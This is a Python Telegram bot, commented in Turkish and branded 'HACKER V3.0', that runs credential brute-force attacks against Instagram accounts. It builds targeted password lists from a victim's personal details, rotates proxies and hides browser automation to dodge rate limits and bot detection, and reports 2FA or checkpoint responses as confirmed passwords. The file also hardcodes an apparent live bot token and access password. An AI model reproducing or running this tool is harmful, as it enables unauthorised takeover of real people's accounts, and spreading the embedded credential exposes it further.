import asyncio
import logging
import random
import time
import json
import re
import requests
import itertools
from typing import List, Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.error import TelegramError
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from urllib.parse import quote
import os

# Log ayarları
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Telegram bot token
TOKEN = "6481633238:AAHMT8V8nHNUsQUm69F1ngczdiFTzJAQJfU"

# Güvenlik şifresi
BOT_PASSWORD = "vio1911"

# CUPP tarzı şifre oluşturucu için yapılandırma
class PasswordGenerator:
    def __init__(self):
        self.config = {
            "chars": ['!', '@', '#', '$', '%', '&', '*', '(', ')', '-', '+', '=', '?'],
            "years": [str(year) for year in range(1980, 2026)],
            "numfrom": 0,
            "numto": 100
        }
        self.leet_rules = {
            'a': ['@', '4'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'],
            's': ['5', '$'], 't': ['7'], 'l': ['1'], 'b': ['8']
        }

    def generate_wordlist(self, profile: dict) -> List[str]:
        wordlist = []
        firstname = profile.get("firstname", "").lower()
        lastname = profile.get("lastname", "").lower()
        birthdate = profile.get("birthdate", "").replace("/", "")
        pet = profile.get("pet", "").lower()
        company = profile.get("company", "").lower()
        keywords = profile.get("keywords", [])

        # Temel kelimeler
        base_words = [word for word in [firstname, lastname, pet, company] if word]
        base_words.extend(keywords)

        # Doğum tarihi varyasyonları
        birthdate_formats = []
        if birthdate and len(birthdate) == 8:
            dd, mm, yyyy = birthdate[:2], birthdate[2:4], birthdate[4:]
            birthdate_formats.extend([dd, mm, yyyy, yyyy[-2:], yyyy[-3:], f"{dd}{mm}", f"{mm}{dd}", f"{dd}{yyyy}", f"{mm}{yyyy}"])

        # Kelime kombinasyonları
        for word in base_words:
            wordlist.append(word)
            wordlist.append(word.capitalize())
            for year in birthdate_formats + self.config["years"]:
                wordlist.append(f"{word}{year}")
                wordlist.append(f"{year}{word}")
            for num in range(self.config["numfrom"], self.config["numto"] + 1):
                wordlist.append(f"{word}{num:02d}")
                wordlist.append(f"{num:02d}{word}")

        # Çift kelime kombinasyonları
        for w1, w2 in itertools.combinations(base_words, 2):
            wordlist.append(f"{w1}{w2}")
            wordlist.append(f"{w2}{w1}")
            wordlist.append(f"{w1.capitalize()}{w2.capitalize()}")
            for year in birthdate_formats + self.config["years"]:
                wordlist.append(f"{w1}{w2}{year}")
                wordlist.append(f"{w2}{w1}{year}")

        # Leet mode
        if profile.get("leetmode", False):
            leet_words = []
            for word in wordlist[:]:
                leet_variations = [word]
                for char, replacements in self.leet_rules.items():
                    new_variations = []
                    for var in leet_variations:
                        if char in var.lower():
                            for repl in replacements:
                                new_variations.append(var.replace(char, repl).replace(char.upper(), repl))
                    leet_variations.extend(new_variations)
                leet_words.extend(leet_variations)
            wordlist.extend(leet_words)

        # Özel karakterler
        if profile.get("spechars", False):
            special_words = []
            for word in wordlist[:]:
                for char in self.config["chars"]:
                    special_words.append(f"{word}{char}")
                    for char2 in self.config["chars"]:
                        special_words.append(f"{word}{char}{char2}")
            wordlist.extend(special_words)

        # Rastgele sayılar
        if profile.get("randnum", False):
            numbered_words = []
            for word in wordlist[:]:
                for num in range(self.config["numfrom"], self.config["numto"] + 1):
                    numbered_words.append(f"{word}{num:02d}")
            wordlist.extend(numbered_words)

        return list(set(wordlist))  # Tekrar edenleri kaldır

class InstagramBruteForce:
    """Instagram brute-force işlemleri için sınıf - 2025 güncel versiyon."""
    
    def __init__(self, user_agent: str = None, proxy_list: List[str] = None):
        self.user_agent = user_agent or self._get_realistic_user_agent()
        self.proxy_list = proxy_list or []
        self.proxy_cycle = itertools.cycle(self.proxy_list) if self.proxy_list else None
        self.current_proxy = None
        self.login_url = 'https://www.instagram.com/accounts/login/'
        self.api_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
        self.session = None
        self.driver = None
        self.csrf_token = None
        self.mid_cookie = None
        self.ig_did = None
        self.rollout_hash = None
        self._initialize()

    def _get_realistic_user_agent(self):
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0"
        ]
        return random.choice(agents)

    def _initialize(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,tr;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        })
        if self.proxy_list:
            self.current_proxy = self._get_working_proxy()
            if self.current_proxy:
                self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
                logger.debug(f"Başlangıç proxy'si ayarlandı: {self.current_proxy}")

    def _get_working_proxy(self, progress_callback: Optional[callable] = None):
        if not self.proxy_list or not self.proxy_cycle:
            if progress_callback:
                progress_callback("⚠️ Proxy listesi boş, proxysiz devam ediliyor...")
            return None
        for _ in range(len(self.proxy_list)):
            proxy = next(self.proxy_cycle)
            try:
                test_session = requests.Session()
                test_session.proxies = {'http': proxy, 'https': proxy}
                response = test_session.get('https://www.instagram.com', timeout=5)
                if response.status_code == 200:
                    test_session.close()
                    logger.debug(f"Çalışan proxy bulundu: {proxy}")
                    if progress_callback:
                        progress_callback(f"✅ Çalışan proxy bulundu: {proxy}")
                    return proxy
                else:
                    logger.warning(f"Proxy başarısız: {proxy}, HTTP {response.status_code}")
            except Exception as e:
                logger.warning(f"Proxy hatası: {proxy}, {str(e)}")
            asyncio.sleep(1)
        logger.error("Hiçbir proxy çalışmıyor!")
        if progress_callback:
            progress_callback("❌ Hiçbir proxy çalışmıyor, proxysiz devam ediliyor...")
        return None

    def _setup_selenium(self):
        options = Options()
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_argument(f'--user-agent={self.user_agent}')
        if self.current_proxy:
            options.add_argument(f'--proxy-server={self.current_proxy}')
        try:
            self.driver = webdriver.Chrome(options=options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            return True
        except Exception as e:
            logger.error(f"Selenium başlatılamadı: {e}")
            return False

    async def _get_initial_cookies_and_tokens(self, progress_callback: Optional[callable] = None):
        max_attempts = 50
        for attempt in range(1, max_attempts + 1):
            if self.proxy_list:
                self.current_proxy = self._get_working_proxy(progress_callback)
                if self.current_proxy:
                    self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
                else:
                    self.session.proxies = {}
            
            try:
                response = self.session.get('https://www.instagram.com/', timeout=15)
                if response.status_code != 200:
                    raise Exception(f"Instagram'a erişilemiyor: {response.status_code}")
                self.mid_cookie = self.session.cookies.get('mid')
                self.ig_did = self.session.cookies.get('ig_did')
                response = self.session.get(self.login_url, timeout=15)
                self.csrf_token = self.session.cookies.get('csrftoken')
                if not self.csrf_token:
                    csrf_match = re.search(r'"csrf_token":"([^"]+)"', response.text)
                    if csrf_match:
                        self.csrf_token = csrf_match.group(1)
                rollout_match = re.search(r'"rollout_hash":"([^"]+)"', response.text)
                if rollout_match:
                    self.rollout_hash = rollout_match.group(1)
                else:
                    self.rollout_hash = str(int(time.time()))
                logger.debug(f"Token'lar alındı: CSRF={self.csrf_token[:20]}..., Rollout={self.rollout_hash}")
                if progress_callback:
                    await progress_callback(f"✅ Token'lar alındı!")
                return self.csrf_token is not None
            except Exception as e:
                logger.error(f"Token alma hatası (Deneme {attempt}/{max_attempts}): {e}")
                if progress_callback:
                    await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
                if attempt < max_attempts:
                    await asyncio.sleep(5)
                continue
        if progress_callback:
            await progress_callback("🔍 Token bulmaya çalışıyorum, sabret... (Selenium'a geçiliyor)")
        return False

    async def _selenium_get_tokens(self, progress_callback: Optional[callable] = None):
        attempt = 1
        while True:
            if self.proxy_list:
                self.current_proxy = self._get_working_proxy(progress_callback)
                if self.current_proxy:
                    if progress_callback:
                        await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
                else:
                    self.current_proxy = None
                    if progress_callback:
                        await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
            
            if not self._setup_selenium():
                if progress_callback:
                    await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
                await asyncio.sleep(5)
                attempt += 1
                continue
            try:
                self.driver.get('https://www.instagram.com/')
                time.sleep(3)
                self.driver.get(self.login_url)
                time.sleep(2)
                csrf_token = self.driver.get_cookie('csrftoken')
                if csrf_token:
                    self.csrf_token = csrf_token['value']
                mid_cookie = self.driver.get_cookie('mid')
                if mid_cookie:
                    self.mid_cookie = mid_cookie['value']
                ig_did = self.driver.get_cookie('ig_did')
                if ig_did:
                    self.ig_did = ig_did['value']
                page_source = self.driver.page_source
                rollout_match = re.search(r'"rollout_hash":"([^"]+)"', page_source)
                if rollout_match:
                    self.rollout_hash = rollout_match.group(1)
                logger.debug(f"Selenium ile token'lar alındı: CSRF={self.csrf_token[:20]}...")
                if progress_callback:
                    await progress_callback(f"✅ Selenium ile token'lar alındı!")
                return self.csrf_token is not None
            except Exception as e:
                logger.error(f"Selenium token alma hatası (Deneme {attempt}): {e}")
                if progress_callback:
                    await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
                await asyncio.sleep(5)
                attempt += 1
            finally:
                if self.driver:
                    self.driver.quit()
                    self.driver = None

    def _make_login_request(self, username: str, password: str):
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,tr;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.instagram.com',
            'Referer': self.login_url,
            'X-CSRFToken': self.csrf_token,
            'X-Instagram-AJAX': self.rollout_hash,
            'X-IG-App-ID': '936619743392459',
            'X-IG-WWW-Claim': '0',
            'X-Requested-With': 'XMLHttpRequest',
        }
        timestamp = int(time.time())
        enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"
        data = {
            'username': username,
            'enc_password': enc_password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'stopDeletionNonce': '',
            'trustedDeviceRecords': '{}'
        }
        try:
            response = self.session.post(self.api_url, headers=headers, data=data, timeout=15)
            logger.debug(f"API Yanıtı: {response.text}")
            with open('instagram_response.json', 'a', encoding='utf-8') as f:
                f.write(f"Şifre: {password}, Yanıt: {response.text}\n")
            return response
        except Exception as e:
            logger.error(f"Login request hatası (Şifre: {password}): {e}")
            with open('instagram_response.json', 'a', encoding='utf-8') as f:
                f.write(f"Şifre: {password}, Hata: {str(e)}\n")
            return None

    def _selenium_login_attempt(self, username: str, password: str):
        if not self._setup_selenium():
            return "ERROR"
        try:
            self.driver.get(self.login_url)
            WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.NAME, "username"))
            )
            username_field = self.driver.find_element(By.NAME, "username")
            password_field = self.driver.find_element(By.NAME, "password")
            for char in username:
                username_field.send_keys(char)
                time.sleep(random.uniform(0.1, 0.3))
            time.sleep(random.uniform(0.5, 1))
            for char in password:
                password_field.send_keys(char)
                time.sleep(random.uniform(0.1, 0.3))
            time.sleep(random.uniform(1, 2))
            login_button = self.driver.find_element(By.XPATH, "//button[@type='submit']")
            login_button.click()
            time.sleep(5)
            current_url = self.driver.current_url
            page_source = self.driver.page_source
            if any(indicator in current_url for indicator in ['/', '/direct/', '/explore/', '/accounts/onetap/']):
                if 'accounts/login' not in current_url:
                    logger.debug("Selenium: Başarılı giriş tespit edildi")
                    with open('instagram_response.json', 'a', encoding='utf-8') as f:
                        f.write(f"Şifre: {password}, Selenium: Başarılı giriş\n")
                    return "SUCCESS"
            if any(indicator in current_url for indicator in ['two_factor', '2fa']) or \
               any(indicator in page_source for indicator in ['two_factor', 'Enter the 6-digit code']):
                logger.debug("Selenium: 2FA gerekli")
                with open('instagram_response.json', 'a', encoding='utf-8') as f:
                    f.write(f"Şifre: {password}, Selenium: 2FA gerekli\n")
                return "2FA"
            if 'checkpoint' in current_url or 'challenge' in current_url:
                logger.debug("Selenium: Checkpoint gerekli")
                with open('instagram_response.json', 'a', encoding='utf-8') as f:
                    f.write(f"Şifre: {password}, Selenium: Checkpoint gerekli\n")
                    return "CHECKPOINT"
            error_indicators = [
                'Sorry, your password was incorrect',
                'The username you entered',
                'incorrect',
                'doesn\'t match',
                'kullanıcı adı',
                'Hatalı şifre',
                'Şifre yanlış',
                'Please check your username',
                'Giriş yapamadık',
                'Lütfen kullanıcı adınızı kontrol edin',
                'The password you entered is incorrect',
                'Please try again'
            ]
            if any(indicator in page_source for indicator in error_indicators):
                logger.debug("Selenium: Yanlış şifre tespit edildi")
                with open('instagram_response.json', 'a', encoding='utf-8') as f:
                    f.write(f"Şifre: {password}, Selenium: Yanlış şifre\n")
                return "WRONG"
            try:
                error_message = self.driver.find_element(By.XPATH, "//div[@id='error_message'] | //p[@id='slfErrorAlert'] | //div[contains(@class, 'error')]")
                if error_message:
                    logger.debug(f"Selenium: Hata mesajı bulundu: {error_message.text}")
                    with open('instagram_response.json', 'a', encoding='utf-8') as f:
                        f.write(f"Şifre: {password}, Selenium: Hata mesajı - {error_message.text}\n")
                    return "WRONG"
            except NoSuchElementException:
                pass
            logger.debug("Selenium: Bilinmeyen durum")
            with open('instagram_response.json', 'a', encoding='utf-8') as f:
                f.write(f"Şifre: {password}, Selenium: Bilinmeyen durum\n")
            return "UNKNOWN"
        except Exception as e:
            logger.error(f"Selenium login hatası (Şifre: {password}): {e}")
            with open('instagram_response.json', 'a', encoding='utf-8') as f:
                f.write(f"Şifre: {password}, Selenium Hata: {str(e)}\n")
            return "ERROR"
        finally:
            if self.driver:
                self.driver.quit()
                self.driver = None

    async def brute_force(self, username: str, password_list: List[str], timeout: int, 
                         progress_callback: Optional[callable] = None):
        start_time = time.time()
        total_passwords = len(password_list)
        potential_passwords = set()
        tried_passwords = 0
        
        await progress_callback(f"\n{'='*50}\nInstagram Brute Force Başlatılıyor\nHedef: {username}\nToplam şifre: {total_passwords}\nTimeout: {timeout} saniye\n{'='*50}\n")
        await progress_callback("🔧 Token'lar alınıyor...")
        
        success = await self._get_initial_cookies_and_tokens(progress_callback)
        if not success:
            await progress_callback("🔍 Token bulmaya çalışıyorum, sabret... (Selenium'a geçiliyor)")
            success = await self._selenium_get_tokens(progress_callback)
        
        if not success:
            await progress_callback("❌ Token'lar alınamadı, işlem durduruluyor!")
            return None

        await progress_callback(f"✅ Token'lar alındı!")

        failed_attempts = 0
        max_failed = 5

        for i, password in enumerate(password_list):
            if time.time() - start_time > timeout:
                await progress_callback(f"\n⏰ Timeout ({timeout}s) aşıldı! Denenen şifre: {tried_passwords}/{total_passwords}")
                break

            if self.proxy_list:
                await progress_callback("🔄 Proxy değiştiriliyor...")
                self.current_proxy = self._get_working_proxy(progress_callback)
                if self.current_proxy:
                    self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
                    await progress_callback(f"✅ Yeni proxy ayarlandı: {self.current_proxy}")
                else:
                    self.session.proxies = {}
                    await progress_callback("🔍 Çalışan proxy bulunamadı, proxysiz devam ediyorum...")

            await progress_callback(f"🔐 Şifre deneniyor: {password}")

            response = self._make_login_request(username, password)
            result = "ERROR"
            
            if response:
                if response.status_code == 200:
                    try:
                        json_data = response.json()
                        logger.debug(f"JSON Yanıtı: {json_data}")
                        if json_data.get('authenticated'):
                            await progress_callback(f"🎉 BAŞARILI! Şifre bulundu: {password}")
                            return password
                        elif json_data.get('authenticated') == False:
                            result = "WRONG"
                            await progress_callback(f"❌ Yanlış şifre: {password}")
                        elif json_data.get('two_factor_required'):
                            await progress_callback(f"🔐 2FA gerekli! Şifre doğru: {password}")
                            return password
                        elif json_data.get('checkpoint_url'):
                            await progress_callback(f"🚧 Checkpoint gerekli! Şifre doğru: {password}")
                            return password
                        elif 'incorrect' in json_data.get('message', '').lower() or \
                             'error' in json_data.get('status', '').lower():
                            result = "WRONG"
                            await progress_callback(f"❌ Yanlış şifre: {password}")
                        else:
                            result = "UNKNOWN"
                            await progress_callback(f"❓ Bilinmeyen yanıt (Şifre: {password}), loglara kaydedildi, devam ediyorum...")
                    except json.JSONDecodeError:
                        potential_passwords.add(password)
                        await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, Selenium deneniyor...")
                        result = self._selenium_login_attempt(username, password)
                elif response.status_code == 429:
                    potential_passwords.add(password)
                    await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, Selenium deneniyor...")
                    await asyncio.sleep(30)
                    result = self._selenium_login_attempt(username, password)
                else:
                    potential_passwords.add(password)
                    await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, Selenium deneniyor...")
                    result = self._selenium_login_attempt(username, password)
            else:
                potential_passwords.add(password)
                await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, Selenium deneniyor...")
                result = self._selenium_login_attempt(username, password)

            if result == "SUCCESS":
                await progress_callback(f"🎉 BAŞARILI! (Selenium) Şifre bulundu: {password}")
                return password
            elif result == "2FA":
                await progress_callback(f"🔐 2FA gerekli! (Selenium) Şifre doğru: {password}")
                return password
            elif result == "CHECKPOINT":
                await progress_callback(f"🚧 Checkpoint gerekli! (Selenium) Şifre doğru: {password}")
                return password
            elif result == "ERROR":
                potential_passwords.add(password)
                await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, tekrar deniyorum...")
                failed_attempts += 1
                if failed_attempts >= max_failed:
                    if self.proxy_list:
                        await progress_callback("🔄 Proxy değiştiriliyor...")
                        self.current_proxy = self._get_working_proxy(progress_callback)
                        if self.current_proxy:
                            self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
                            await progress_callback(f"✅ Yeni proxy ayarlandı: {self.current_proxy}")
                            failed_attempts = 0
                        else:
                            await progress_callback("🔍 Çalışan proxy bulunamadı, proxysiz devam ediyorum...")
                            await asyncio.sleep(60)
                    else:
                        await progress_callback("🔍 60 saniye bekleniyor...")
                        await asyncio.sleep(60)
                        failed_attempts = 0

            tried_passwords += 1

            if (i + 1) % 5 == 0:
                await progress_callback("🔄 Token'lar yenileniyor...")
                success = await self._get_initial_cookies_and_tokens(progress_callback)
                if not success:
                    await progress_callback("🔍 Token bulmaya çalışıyorum, sabret... (Selenium'a geçiliyor)")
                    success = await self._selenium_get_tokens(progress_callback)
                if not success:
                    await progress_callback("🔍 Token'lar alınamadı, devam ediyorum...")

            delay = random.uniform(10, 20)
            await progress_callback(f"⏳ {delay:.1f}s bekleniyor...")
            await asyncio.sleep(delay)

        # İşlem sonu rapor
        report = f"📊 Rapor:\n- Denenen şifre sayısı: {tried_passwords}/{total_passwords}\n"
        if potential_passwords:
            report += f"- Kullanıcı adı doğru ama hata alınan şifreler (doğru olabilir, manuel olarak kontrol et): {', '.join(potential_passwords)}\n"
        await progress_callback(report)
        await progress_callback(f"⏰ Timeout ({timeout}s) aşıldı veya tüm şifreler denendi! Denenen şifre: {tried_passwords}/{total_passwords}")
        return None

class TelegramBot:
    def __init__(self):
        self.user_data = {}
        self.brute_force_tasks = {}
        self.password_generator = PasswordGenerator()

    def _initialize_user_data(self, user_id: int):
        if user_id not in self.user_data:
            self.user_data[user_id] = {
                'username': None,
                'password_file': None,
                'proxy_file': None,
                'timeout': 1800,
                'password_profile': {
                    'firstname': '', 'lastname': '', 'birthdate': '',
                    'pet': '', 'company': '', 'keywords': [],
                    'leetmode': False, 'spechars': False, 'randnum': False
                }
            }

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        self._initialize_user_data(user_id)
        await update.message.reply_text("🔒 Lütfen bot şifresini girin:")
        context.user_data['awaiting'] = 'password'

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        self._initialize_user_data(user_id)

        awaiting = context.user_data.get('awaiting')
        if not awaiting:
            return

        if awaiting == 'password':
            entered_password = update.message.text.strip()
            if entered_password == BOT_PASSWORD:
                context.user_data['awaiting'] = None
                welcome_message = "👾 HACKER V3.0 AKTİF! 👾\n🔥 Hoş geldin V.VV SUNAR KEYFİNE BAK 🔥"
                keyboard = [
                    [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
                    [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
                    [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
                    [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
                    [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
                    [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
                    [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode='Markdown')
            else:
                await update.message.reply_text("❌ Yanlış şifre! Tekrar dene.")
                return
        elif awaiting == 'username':
            self.user_data[user_id]['username'] = update.message.text.strip()
            await update.message.reply_text(f"✅ Kullanıcı adı ayarlandı: {self.user_data[user_id]['username']}")
        elif awaiting == 'password_file':
            if update.message.document:
                file = await update.message.document.get_file()
                file_path = f"passwords_{user_id}.txt"
                await file.download_to_drive(file_path)
                self.user_data[user_id]['password_file'] = file_path
                await update.message.reply_text("✅ Şifre listesi yüklendi!")
            else:
                await update.message.reply_text("❌ Lütfen bir .txt dosyası yükle!")
                return
        elif awaiting == 'proxy_file':
            if update.message.document:
                file = await update.message.document.get_file()
                file_path = f"proxies_{user_id}.txt"
                await file.download_to_drive(file_path)
                self.user_data[user_id]['proxy_file'] = file_path
                await update.message.reply_text("✅ Proxy listesi yüklendi!")
            else:
                await update.message.reply_text("❌ Lütfen bir .txt dosyası yükle!")
                return
        elif awaiting == 'timeout':
            try:
                timeout = int(update.message.text)
                if 60 <= timeout <= 7200:
                    self.user_data[user_id]['timeout'] = timeout
                    await update.message.reply_text(f"✅ Timeout ayarlandı: {timeout} saniye")
                else:
                    await update.message.reply_text("❌ Timeout 60-7200 saniye arasında olmalı!")
            except ValueError:
                await update.message.reply_text("❌ Lütfen geçerli bir sayı gir!")
            return
        elif awaiting == 'generate_firstname':
            self.user_data[user_id]['password_profile']['firstname'] = update.message.text.strip()
            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_lastname')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text("📝 Soyadı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
            context.user_data['awaiting'] = 'generate_lastname'
            return
        elif awaiting == 'generate_lastname':
            self.user_data[user_id]['password_profile']['lastname'] = update.message.text.strip()
            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_birthdate')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text("📝 Doğum tarihi gir (DDMMYYYY, ör: 05071978, boş bırakmak için butona bas):", reply_markup=reply_markup)
            context.user_data['awaiting'] = 'generate_birthdate'
            return
        elif awaiting == 'generate_birthdate':
            birthdate = update.message.text.strip()
            if birthdate and (len(birthdate) != 8 or not birthdate.isdigit()):
                await update.message.reply_text("❌ Doğum tarihi 8 haneli olmalı (DDMMYYYY)! Tekrar dene:")
                return
            self.user_data[user_id]['password_profile']['birthdate'] = birthdate
            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_pet')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text("📝 Evcil hayvan adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
            context.user_data['awaiting'] = 'generate_pet'
            return
        elif awaiting == 'generate_pet':
            self.user_data[user_id]['password_profile']['pet'] = update.message.text.strip()
            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_company')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text("📝 Şirket adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
            context.user_data['awaiting'] = 'generate_company'
            return
        elif awaiting == 'generate_company':
            self.user_data[user_id]['password_profile']['company'] = update.message.text.strip()
            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_keywords')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text("📝 Ek anahtar kelimeler gir (virgülle ayır, ör: hacker,juice, boş bırakmak için butona bas):", reply_markup=reply_markup)
            context.user_data['awaiting'] = 'generate_keywords'
            return
        elif awaiting == 'generate_keywords':
            keywords = update.message.text.strip()
            self.user_data[user_id]['password_profile']['keywords'] = [k.strip() for k in keywords.split(',') if k.strip()] if keywords else []
            keyboard = [
                [InlineKeyboardButton("Evet", callback_data='leet_yes'), InlineKeyboardButton("Hayır", callback_data='leet_no')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text("🔢 Leet mode? (ör: leet → 1337)", reply_markup=reply_markup)
            context.user_data['awaiting'] = 'generate_leet'
            return

        context.user_data['awaiting'] = None
        keyboard = [
            [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
            [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
            [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
            [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
            [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
            [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("➡️ Başka ne yapmak istersin?", reply_markup=reply_markup)

    async def button(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id

        self._initialize_user_data(user_id)

        if query.data == 'set_username':
            await query.message.reply_text("🎯 Lütfen Instagram kullanıcı adını gir:")
            context.user_data['awaiting'] = 'username'
        elif query.data == 'set_password_file':
            await query.message.reply_text("📜 Lütfen şifre listesi dosyasını (.txt) yükle:")
            context.user_data['awaiting'] = 'password_file'
        elif query.data == 'set_proxy_file':
            await query.message.reply_text("🌐 Lütfen proxy listesi dosyasını (.txt) yükle (isteğe bağlı):")
            context.user_data['awaiting'] = 'proxy_file'
        elif query.data == 'set_timeout':
            await query.message.reply_text("⏰ Lütfen timeout süresini (saniye) gir (60-7200 arası):")
            context.user_data['awaiting'] = 'timeout'
        elif query.data == 'generate_password_list':
            await query.message.reply_text("🔑 Şifre listesi oluşturmak için bilgileri gir. Adı gir (boş bırakmak için butona bas):")
            context.user_data['awaiting'] = 'generate_firstname'
        elif query.data == 'leet_yes':
            self.user_data[user_id]['password_profile']['leetmode'] = True
            keyboard = [
                [InlineKeyboardButton("Evet", callback_data='spechars_yes'), InlineKeyboardButton("Hayır", callback_data='spechars_no')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text("🔣 Özel karakterler eklemek ister misiniz? (ör: !, @, #)", reply_markup=reply_markup)
            context.user_data['awaiting'] = 'generate_spechars'
        elif query.data == 'leet_no':
            self.user_data[user_id]['password_profile']['leetmode'] = False
            keyboard = [
                [InlineKeyboardButton("Evet", callback_data='spechars_yes'), InlineKeyboardButton("Hayır", callback_data='spechars_no')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text("🔣 Özel karakterler eklemek ister misiniz? (ör: !, @, #)", reply_markup=reply_markup)
            context.user_data['awaiting'] = 'generate_spechars'
        elif query.data == 'spechars_yes':
            self.user_data[user_id]['password_profile']['spechars'] = True
            keyboard = [
                [InlineKeyboardButton("Evet", callback_data='randnum_yes'), InlineKeyboardButton("Hayır", callback_data='randnum_no')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text("🔢 Rastgele sayılar eklemek ister misiniz? (ör: 01, 99)", reply_markup=reply_markup)
            context.user_data['awaiting'] = 'generate_randnum'
        elif query.data == 'spechars_no':
            self.user_data[user_id]['password_profile']['spechars'] = False
            keyboard = [
                [InlineKeyboardButton("Evet", callback_data='randnum_yes'), InlineKeyboardButton("Hayır", callback_data='randnum_no')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text("🔢 Rastgele sayılar eklemek ister misiniz? (ör: 01, 99)", reply_markup=reply_markup)
            context.user_data['awaiting'] = 'generate_randnum'
